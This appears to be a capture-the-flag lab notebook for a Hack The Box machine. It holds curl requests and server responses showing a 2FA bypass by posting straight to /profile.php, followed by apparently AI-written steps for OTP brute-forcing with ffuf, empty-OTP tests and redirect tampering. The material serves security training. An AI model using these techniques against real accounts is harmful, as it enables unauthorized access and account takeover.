@@ -1,0 +1,309 @@
+curl -X POST "http://94.237.57.57:47251/2fa.php" \
+  -d "otp=123456" \
+  -H "Cookie: PHPSESSID=qu591frmcednmiurqp5g383itb" \
+  -H "Content-Type: application/x-www-form-urlencoded" -v
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 94.237.57.57:47251...
+* Connected to 94.237.57.57 (94.237.57.57) port 47251
+* using HTTP/1.x
+> POST /2fa.php HTTP/1.1
+> Host: 94.237.57.57:47251
+> User-Agent: curl/8.11.1
+> Accept: */*
+> Cookie: PHPSESSID=qu591frmcednmiurqp5g383itb
+> Content-Type: application/x-www-form-urlencoded
+> Content-Length: 10
+> 
+* upload completely sent off: 10 bytes
+< HTTP/1.1 302 Found
+< Date: Thu, 12 Jun 2025 03:48:21 GMT
+< Server: Apache/2.4.59 (Debian)
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< Location: /login.php
+< Content-Length: 4009
+< Content-Type: text/html; charset=UTF-8
+< 
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/main.css">
+    <link rel="stylesheet" href="css/now-ui-kit.css">
+    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,600,700,800,900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,600,700,800,900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,600,700,800,900&display=swap" rel="stylesheet">
+    <title>MetaDocs</title>
+</head>
+<body>
+<nav class="navbar navbar-expand-lg bg-transparent">
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <img src="assets/menuIcon.svg" width="20px" height="20px" style="max-width: none !important;">
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent" style="margin-left: 20px !important">
+        <ul class="navbar-nav mr-auto">
+            <li class="nav-item active">
+                <a class="nav-link" href="/index.php">Home <span class="sr-only">(current)</span></a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="#">Features</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="#">Dashboard</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="#">Subscription</a>
+            </li>
+        </ul>
+        <div class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                Documentation
+            </a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                <a class="dropdown-item" href="#">Commands</a>
+                <a class="dropdown-item" href="#">Tutorials</a>
+                <div class="dropdown-divider"></div>
+                <a class="dropdown-item" href="#">Server settings</a>
+            </div>
+        </div>
+        <div class="nav-item">
+            <a class="nav-link" href="#">About</a>
+        </div>
+        <button class="btn login-btn btn-outline-accent my-2 my-sm-0" style="font-size: 10px !important;font-family: poppins !important;" onclick="location.href='/logout.php';">LOGOUT</button>
+    </div>
+</nav>
+
+
+<div class="heading">
+    <h1 class="display-5 title">Please provide your 2FA OTP</h1>
+    <br />
+    <div class="cards">
+
+                    <div class="alert alert-danger" role="alert">Invalid OTP.</div>        
+    <form method="POST" action="/2fa.php">
+  <div class="form-group">
+    <label for="otp">OTP</label>
+    <input type="text" class="form-control" id="otp" name="otp" aria-describedby="emailHelp" placeholder="Enter OTP">
+  </div>
+  <button type="submit" class="btn btn-primary">Submit</button>
+</form>
+</div>
+</div>
+
+<div class="page_end">
+    <div class="footer">
+        <div class="bot-footer">
+            Copyright © metadocs.htb - 2024
+        </div><br/>
+    </div>
+</div>
+<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+<script src="js/now-ui-kit.min.js"></script>
+</body>
+</html>
+* Connection #0 to host 94.237.57.57 left intact
+
+
+
+
+curl -X POST "http://94.237.57.57:47251/profile.php" \
+  -H "Cookie: PHPSESSID=qu591frmcednmiurqp5g383itb" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "dummy=1" -v
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 94.237.57.57:47251...
+* Connected to 94.237.57.57 (94.237.57.57) port 47251
+* using HTTP/1.x
+> POST /profile.php HTTP/1.1
+> Host: 94.237.57.57:47251
+> User-Agent: curl/8.11.1
+> Accept: */*
+> Cookie: PHPSESSID=qu591frmcednmiurqp5g383itb
+> Content-Type: application/x-www-form-urlencoded
+> Content-Length: 7
+> 
+* upload completely sent off: 7 bytes
+< HTTP/1.1 302 Found
+< Date: Thu, 12 Jun 2025 03:50:29 GMT
+< Server: Apache/2.4.59 (Debian)
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< Location: /2fa.php
+< Content-Length: 3647
+< Content-Type: text/html; charset=UTF-8
+< 
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/main.css">
+    <link rel="stylesheet" href="css/now-ui-kit.css">
+    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,600,700,800,900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,600,700,800,900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,600,700,800,900&display=swap" rel="stylesheet">
+    <title>MetaDocs</title>
+</head>
+<body>
+<nav class="navbar navbar-expand-lg bg-transparent">
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <img src="assets/menuIcon.svg" width="20px" height="20px" style="max-width: none !important;">
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent" style="margin-left: 20px !important">
+        <ul class="navbar-nav mr-auto">
+            <li class="nav-item active">
+                <a class="nav-link" href="/index.php">Home <span class="sr-only">(current)</span></a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="#">Features</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="#">Dashboard</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="#">Subscription</a>
+            </li>
+        </ul>
+        <div class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                Documentation
+            </a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                <a class="dropdown-item" href="#">Commands</a>
+                <a class="dropdown-item" href="#">Tutorials</a>
+                <div class="dropdown-divider"></div>
+                <a class="dropdown-item" href="#">Server settings</a>
+            </div>
+        </div>
+        <div class="nav-item">
+            <a class="nav-link" href="#">About</a>
+        </div>
+        <button class="btn login-btn btn-outline-accent my-2 my-sm-0" style="font-size: 10px !important;font-family: poppins !important;" onclick="location.href='/logout.php';">LOGOUT</button>
+    </div>
+</nav>
+
+
+<div class="heading">
+    <h1 class="display-5 title">Welcome gladys!</h1>
+    <br />
+    <div class="cards">
+
+      HTB{flag}
+</div>
+</div>
+
+<div class="page_end">
+    <div class="footer">
+        <div class="bot-footer">
+            Copyright © metadocs.htb - 2024
+        </div><br/>
+    </div>
+</div>
+<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+<script src="js/now-ui-kit.min.js"></script>
+</body>
+</html>
+* Connection #0 to host 94.237.57.57 left intact
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+From the curl output, we can see that:
+
+The server responds with a 302 redirect to /login.php when an invalid OTP (like 123456) is submitted.
+
+The response body contains an Invalid OTP error message inside an HTML page.
+
+Key Observations:
+The PHPSESSID cookie is valid (since you didn't get a "session expired" message).
+
+The server does not leak the flag in this response.
+
+The /2fa.php endpoint enforces OTP validation (since wrong OTPs redirect to /login.php).
+
+Next Steps to Find the Flag:
+Since brute-forcing /2fa.php isn't working, let's try bypassing 2FA (as hinted earlier):
+
+1. Directly Access /profile.php (Bypass 2FA)
+bash
+curl -X POST "http://94.237.57.57:47251/profile.php" \
+  -H "Cookie: PHPSESSID=qu591frmcednmiurqp5g383itb" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "dummy=1" -v
+If this works, the 2FA check is broken, and you'll see the flag in the response.
+
+2. Check for Hidden Endpoints
+Try common paths like:
+
+bash
+curl "http://94.237.57.57:47251/admin.php" \
+  -H "Cookie: PHPSESSID=qu591frmcednmiurqp5g383itb"
+Sometimes, flags are hidden in admin panels or debug pages.
+
+3. Manipulate the Location Header
+The server redirects (302 Found) to /login.php. Try intercepting the request (with Burp/ZAP) and:
+
+Remove the Location header to see the full response.
+
+Change 302 Found to 200 OK to bypass redirection.
+
+4. Test for OTP Bypass Tricks
+Submit empty or malformed OTPs:
+
+bash
+curl -X POST "http://94.237.57.57:47251/2fa.php" \
+  -H "Cookie: PHPSESSID=qu591frmcednmiurqp5g383itb" \
+  -d "otp="  # Empty OTP
+Some systems fail open if the OTP is missing.
+
+If All Else Fails:
+Brute-force with ffuf + Filter Errors
+
+bash
+ffuf -u "http://94.237.57.57:47251/2fa.php" -X POST \
+  -d "otp=FUZZ" \
+  -H "Cookie: PHPSESSID=qu591frmcednmiurqp5g383itb" \
+  -w 6_digit_mix.txt \
+  -fr "Invalid OTP"  # Filter out responses containing this
+-fr hides responses with "Invalid OTP", leaving only potential successes.
+
+Check for Race Conditions
+
+Send multiple OTPs rapidly (some systems improperly validate the first request).
+
+Expected Results:
+If /profile.php works → Flag is leaked.
+
+If brute-forcing finds a valid OTP → Flag appears.
+
+If nothing works → Check for other vulnerabilities (e.g., IDOR, SSTI).
